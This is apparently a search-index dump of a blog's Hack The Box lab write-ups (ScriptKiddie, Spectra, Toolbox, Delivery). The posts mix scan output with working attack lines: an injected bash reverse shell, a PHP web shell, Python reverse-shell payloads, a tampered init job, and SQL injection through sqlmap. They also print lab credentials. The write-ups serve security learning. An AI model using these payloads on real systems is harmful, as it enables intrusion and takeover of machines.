file The script cuts out the 3 column and supplies it to nmap, so we add \u0026lsquo;a a 127.0.0.1\u0026rsquo; to pass the check Then we have our command and comment out the rest of the command with # Let\u0026rsquo;s get reverse shell echo \u0026quot;a a 127.0.0.1;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.12/7777 0\u0026gt;\u0026amp;1' #\u0026quot; \u0026gt; hackers Root pwn has sudo rights Follow GTFOBins to get a root ","date":"July 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/images/scriptkiddie.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/","summary":"ScriptKiddie Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.226 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 19:55 BST Nmap scan report for 10.10.10.226 (10.10.10.226) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA) | 256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA) |_ 256 8bcf4182c6acef9180377cc94511e843 (ED25519) 5000/tcp open http Werkzeug httpd 0.","tags":["HTB","msfvenom","command-injection","irb","msfconsole"],"title":"[HTB] Machine: ScriptKiddie"},{"categories":null,"contents":"Spectra Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.229 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 12:59 BST Nmap scan report for 10.10.10.229 (10.10.10.229) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn\u0026#39;t have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.25 seconds Web server The domain: spectra.htb If we check /testing We see the config file wp-config.php which runs php in the background if we click it We see another config file wp-config.php.save, which wascreated by nano ...nano will try to dump the buffer into an emergency file. This will happen mainly if nano receives a SIGHUP or SIGTERM or runs out of memory. It will write the buffer into a file named nano.save if the buffer didnâ€™t have a name already, or will add a â€œ.saveâ€ suffix to the current filename... Let\u0026rsquo;s save the creds devtest:devteam01 Any try to connect to MySQL But no success We saw that the website on /main was a WordPress site So let\u0026rsquo;s launch a wpscan â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/tasks] â””â”€$ wpscan --url http://10.10.10.229/main _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n ^C^C^C^C^C^C Scan Aborted: Canceled by User â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents/tasks] â””â”€$ wpscan --url http://spectra.htb/main -e ap,t,tt,u _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://spectra.htb/main/ [10.10.10.229] [+] Started: Sat Aug 5 13:17:25 2023 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: nginx/1.17.4 | - X-Powered-By: PHP/5.6.40 | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://spectra.htb/main/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://spectra.htb/main/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://spectra.htb/main/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://spectra.htb/main/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; | - http://spectra.htb/main/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.2\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 2.2 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2 | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: \u0026#39;Version: 1.2\u0026#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Most Popular Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:21 \u0026lt;============================================================================================================================================================\u0026gt; (399 / 399) 100.00% Time: 00:00:21 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] Theme(s) Identified: [+] twentynineteen | Location: http://spectra.htb/main/wp-content/themes/twentynineteen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentynineteen/readme.txt | [!] The version is out of date, the latest version is 2.5 | Style URL: http://spectra.htb/main/wp-content/themes/twentynineteen/style.css | Style Name: Twenty Nineteen | Style URI: https://wordpress.org/themes/twentynineteen/ | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://spectra.htb/main/wp-content/themes/twentynineteen/, status: 200 | | Version: 1.5 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentynineteen/style.css, Match: \u0026#39;Version: 1.5\u0026#39; [+] twentyseventeen | Location: http://spectra.htb/main/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentyseventeen/readme.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://spectra.htb/main/wp-content/themes/twentyseventeen/style.css | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://spectra.htb/main/wp-content/themes/twentyseventeen/, status: 200 | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentyseventeen/style.css, Match: \u0026#39;Version: 2.3\u0026#39; [+] twentytwenty | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt | [!] The version is out of date, the latest version is 2.2 | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css | Style Name: Twenty Twenty | Style URI: https://wordpress.org/themes/twentytwenty/ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Urls In Homepage (Passive Detection) | Confirmed By: Known Locations (Aggressive Detection) | - http://spectra.htb/main/wp-content/themes/twentytwenty/, status: 200 | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css, Match: \u0026#39;Version: 1.2\u0026#39; [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:51 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:51 [i] No Timthumbs Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:11 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:11 [i] User(s) Identified: [+] administrator | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Aug 5 13:20:06 2023 [+] Requests Done: 3035 [+] Cached Requests: 17 [+] Data Sent: 859.413 KB [+] Data Received: 1.155 MB [+] Memory used: 286.766 MB [+] Elapsed time: 00:02:40 Foothold We have administrator user If we try the password that we found before, we can access wp-admin Administrator:devteam01 Let\u0026rsquo;s edit installed plugins and get RCE system($_REQUEST[\u0026quot;cmd\u0026quot;]); Let\u0026rsquo;s get reverse shell Url encode the following payload: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.16.2\u0026quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' And we have our foothold User So we have a Chromium OS nginx@spectra /home $ cat /etc/*release BUILD_NUMBER=22 CHROMEOVER_BUILD_COMMIT=829e617e7b8467c355f9bd61f87835bfeb0da547 CHROMIUMOS_MANIFEST_COMMIT=38c4f6ca60a47f7fabf0fcd5d6feabf349e3f002 CHROMIUM_BROWSER_COMMIT=ef24d0b3349c2324d18a3f32bc35d14e796aeddc PIPELINE_TAG=prod USE_FLAGS=-cros-debug beerover virtualbox GOOGLE_RELEASE=87.3.41 CHROMEOS_RELEASE_BRANCH_NUMBER=85 CHROMEOS_RELEASE_TRACK=stable-channel CHROMEOS_RELEASE_KEYSET=devkeys CHROMEOS_RELEASE_NAME=Chromium OS CHROMEOS_AUSERVER=https://cloudready-free-update-server-2.neverware.com/update CHROMEOS_RELEASE_BOARD=chromeover64 CHROMEOS_DEVSERVER=https://cloudready-free-update-server-2.neverware.com/ CHROMEOS_RELEASE_BUILD_NUMBER=13505 CHROMEOS_CANARY_APPID={90F229CE-83E2-4FAF-8479-E368A34938B1} CHROMEOS_RELEASE_CHROME_MILESTONE=87 CHROMEOS_RELEASE_PATCH_NUMBER=2021_01_15_2352 CHROMEOS_RELEASE_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_BOARD_APPID=87efface-864d-49a5-9bb3-4b050a7c227a CHROMEOS_RELEASE_BUILD_TYPE=Developer Build - neverware CHROMEOS_RELEASE_VERSION=87.3.41 CHROMEOS_RELEASE_DESCRIPTION=87.3.41 (Developer Build - neverware) stable-channel chromeover64 We have a autologin.conf.orig file in /opt If we check it, we see that it\u0026rsquo;s a script It reads password from the files /mnt/stateful_partition/etc/autologin/passwd and from /etc/autologin/passwd Only /etc/autologin/passwd exists, and if we open it we see the potential password SummerHereWeCome!! Let\u0026rsquo;s ssh We can use crackmapexec to test each connection But since I saw user.txt in katie\u0026rsquo;s folder, I just guessed it and got access Root Check sudo rights We have /sbin/initctl https://linux.die.net/man/8/initctl initctl allows a system administrator to communicate and interact with the Upstart init(8) daemon https://linux.die.net/man/8/init init is the parent of all processes on the system, it is executed by the kernel and is responsible for starting all other processes If we check katie\u0026rsquo;s group We see that she\u0026rsquo;s a member of developers group katie@spectra ~ $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers) Let\u0026rsquo;s search for files owned by developers So we see the that developers have several test jobs inside /etc/init directory So we can try and modify one of them Let\u0026rsquo;s edit one of those .conf files Add exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.16.2\u0026quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);' Launch a listener and sudo initctl start test Rooted ","date":"July 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/spectra/images/spectra.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/spectra/","summary":"Spectra Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.229 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 12:59 BST Nmap scan report for 10.10.10.229 (10.10.10.229) Host is up (0.16s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn\u0026#39;t have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) Service detection performed.","tags":["HTB","chromeos","nano","wordpress","wpscan","wordpress-plugin","autologon-credentials","initctl","sudo"],"title":"[HTB] Machine: Spectra"},{"categories":null,"contents":"Toolbox Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.236 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 19:02 BST Nmap scan report for 10.10.10.236 (10.10.10.236) Host is up (0.15s latency). PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 5b1aa18199eaf79602192e6e97045a3f (RSA) | 256 a24b5ac70ff399a13aca7d542876b2dd (ECDSA) |_ 256 ea08966023e2f44f8d05b31841352339 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) |_http-title: MegaLogistics | ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR | Not valid before: 2020-02-18T17:45:56 |_Not valid after: 2021-02-17T17:45:56 | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.38 (Debian) 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-07-09T18:02:45 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required |_clock-skew: -32s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.49 seconds Web server There is also a certificate for admin.megalogistic.com ffuf â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://10.10.10.236 -H \u0026#34;Host: FUZZ.megalogistic.com\u0026#34; -k -fs 22357 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : https://10.10.10.236 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.megalogistic.com :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 22357 ________________________________________________ [Status: 200, Size: 889, Words: 134, Lines: 36, Duration: 124ms] admin.megalogistic.com ftp smb Foothold/User So the only option is to check admin panel I went through possible entry point payloads We have an error indicating that the backend database is postgresql Since we know the database, we can test bypass login payloads from Hacktricks I went with the following payload ' or 1=1 -- But found nothing So I ran sqlmap by saving request file from Burp sqlmap -r admin.megalogistic --force-ssl --batch --dbs to list databases sqlmap -r admin.megalogistic --force-ssl --batch -D public --tables to dump tables from public database sqlmap -r admin.megalogistic --force-ssl --batch -D public -T users --dump to dump users table Retrieved admin\u0026rsquo;s hash 4a100a85cb5ca3616dcf137918550815 - but failed to crack it Let\u0026rsquo;s try executing commands sqlmap -r admin.megalogistic --force-ssl --batch --os-cmd whoami And it works Let\u0026rsquo;s get reverse shell Spawn interactive shell to send a payload sqlmap -r admin.megalogistic --force-ssl --batch --os-shell Payload: bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.12/6666 0\u0026gt;\u0026amp;1\u0026quot; The flag can be found in /var/lib/postgresql folder Root Currently we\u0026rsquo;re in the container and need to escape it Enumeration of the container revealed nothing We might need to check the exe file found in ftp We saw Docker Toolbox Found boot2docker Apparently we can ssh to VM using following credentials docker:tcuser If we check ifconfig, we have 172.17.0.2 so VM is probably .1 We have sudo rights If we check the /etc/*release It is indeed boot2docker Let\u0026rsquo;s continue checking directories We have c folder in the / path If we check it, we see Users If we continue following the path, we have an access to Administrator\u0026rsquo;s directory So Users is probably mounted to c If we check Administrator\u0026rsquo;s directory we find .ssh folder which contains his keys Let\u0026rsquo;s copy them and connect ","date":"July 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/toolbox/images/toolbox.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/toolbox/","summary":"Toolbox Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.236 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 19:02 BST Nmap scan report for 10.10.10.236 (10.10.10.236) Host is up (0.15s latency). PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.","tags":["HTB","docker-toolbox","ffuf","sqli","postgresql","sqlmap","docker","container"],"title":"[HTB] Machine: Toolbox"},{"categories":null,"contents":"Delivery Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.222 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 11:18 BST Nmap scan report for 10.10.10.222 (10.10.10.222) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c40fa859b01acac0ebc0c19518aee27 (RSA) | 256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA) |_ 256 b79df7489da2f27630fd42d3353a808c (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open unknown | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Accept-Ranges: bytes | Cache-Control: no-cache, max-age=31556926, public | Content-Length: 3108 | Content-Security-Policy: frame-ancestors \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; cdn.rudderlabs.com | Content-Type: text/html; charset=utf-8 | Last-Modified: Sat, 08 Jul 2023 09:51:21 GMT | X-Frame-Options: SAMEORIGIN | X-Request-Id: 6oxj36iapprdtktd5691zuzu4r | X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false | Date: Sat, 08 Jul 2023 10:17:53 GMT | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;robots\u0026#34; content=\u0026#34;noindex, nofollow\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;no-referrer\u0026#34;\u0026gt;\u0026lt;title\u0026gt;Mattermost\u0026lt;/title\u0026gt;\u0026lt;meta name=\u0026#34;mobile-web-app-capable\u0026#34; content=\u0026#34;yes\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;application-name\u0026#34; content=\u0026#34;Mattermost\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;format-detection\u0026#34; content=\u0026#34;telephone=no\u0026#34;\u0026gt;\u0026lt;link re | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Date: Sat, 08 Jul 2023 10:17:53 GMT |_ Content-Length: 0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8065-TCP:V=7.93%I=7%D=7/8%Time=64A937EE%P=x86_64-pc-linux-gnu%r(Gen SF:ericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te SF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2 SF:0Request\u0026#34;)%r(GetRequest,DF3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nAccept-Ranges:\\x SF:20bytes\\r\\nCache-Control:\\x20no-cache,\\x20max-age=31556926,\\x20public\\r SF:\\nContent-Length:\\x203108\\r\\nContent-Security-Policy:\\x20frame-ancestor SF:s\\x20\u0026#39;self\u0026#39;;\\x20script-src\\x20\u0026#39;self\u0026#39;\\x20cdn\\.rudderlabs\\.com\\r\\nContent SF:-Type:\\x20text/html;\\x20charset=utf-8\\r\\nLast-Modified:\\x20Sat,\\x2008\\x SF:20Jul\\x202023\\x2009:51:21\\x20GMT\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nX SF:-Request-Id:\\x206oxj36iapprdtktd5691zuzu4r\\r\\nX-Version-Id:\\x205\\.30\\.0 SF:\\.5\\.30\\.1\\.57fb31b889bf81d99d8af8176d4bbaaa\\.false\\r\\nDate:\\x20Sat,\\x2 SF:008\\x20Jul\\x202023\\x2010:17:53\\x20GMT\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x2 SF:0lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;viewport\\ SF:\u0026#34;\\x20content=\\\u0026#34;width=device-width,initial-scale=1,maximum-scale=1,user- SF:scalable=0\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;robots\\\u0026#34;\\x20content=\\\u0026#34;noindex,\\x20nofollow SF:\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;referrer\\\u0026#34;\\x20content=\\\u0026#34;no-referrer\\\u0026#34;\u0026gt;\u0026lt;title\u0026gt;Matterm SF:ost\u0026lt;/title\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;mobile-web-app-capable\\\u0026#34;\\x20content=\\\u0026#34;yes\\\u0026#34;\u0026gt; SF:\u0026lt;meta\\x20name=\\\u0026#34;application-name\\\u0026#34;\\x20content=\\\u0026#34;Mattermost\\\u0026#34;\u0026gt;\u0026lt;meta\\x20n SF:ame=\\\u0026#34;format-detection\\\u0026#34;\\x20content=\\\u0026#34;telephone=no\\\u0026#34;\u0026gt;\u0026lt;link\\x20re\u0026#34;)%r(HT SF:TPOptions,5B,\u0026#34;HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nDate:\\x20 SF:Sat,\\x2008\\x20Jul\\x202023\\x2010:17:53\\x20GMT\\r\\nContent-Length:\\x200\\r\\ SF:n\\r\\n\u0026#34;)%r(RTSPRequest,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent SF:-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n4 SF:00\\x20Bad\\x20Request\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\ SF:nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20 SF:Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConn SF:ection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie, SF:67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\ SF:x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 103.27 seconds Web Server Mattermost Foothold If we scan through web server, we will find links pointing to helpdesk.delivery.htb The hint on web server page We can only access MatterMost if we have @delivery.htb email We can also create tickets on helpdesk.delivery.htb When we create the ticket we get an @delivery.htb We can try using it for registration on MatterMost Let\u0026rsquo;s create a ticket Create an account on MatterMost using ticket information Check the ticket status and visit the confirmation link Access MatterMost And find the creds maildeliverer:Youve_G0t_Mail! We have our ssh connection Root Let\u0026rsquo;s enumerate linpeas showed mattermost\u0026rsquo;s location We have mysql credentials in the config file mmuser:Crack_The_MM_Admin_PW Connect to mysql We found users table with creds Let\u0026rsquo;s crack it using hashcat I remembered the PleaseSubscribe! that was mentioned in the comments We can use the hashcat\u0026rsquo;s rules to generate different variations of the same password And we have our password Rooted ","date":"July 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/delivery/images/delivery.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/delivery/","summary":"Delivery Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.222 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 11:18 BST Nmap scan report for 10.10.10.222 (10.10.10.222) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c40fa859b01acac0ebc0c19518aee27 (RSA) | 256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA) |_ 256 b79df7489da2f27630fd42d3353a808c (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open unknown | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.","tags":["HTB","hashcat","hashcat-rules","vhosts"],"title":"[HTB] Machine: Delivery"},{"categories":null,"contents":"Academy Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.215 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 17:02 BST Nmap scan report for 10.10.10.215 (10.10.10.215) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c090a3d835256ffa3306cf8013a0a553 (RSA) | 256 2ad54bd046f0edc93c8df65dabae7796 (ECDSA) |_ 256 e16414c3cc51b23ba628a7b1ae5f4535 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 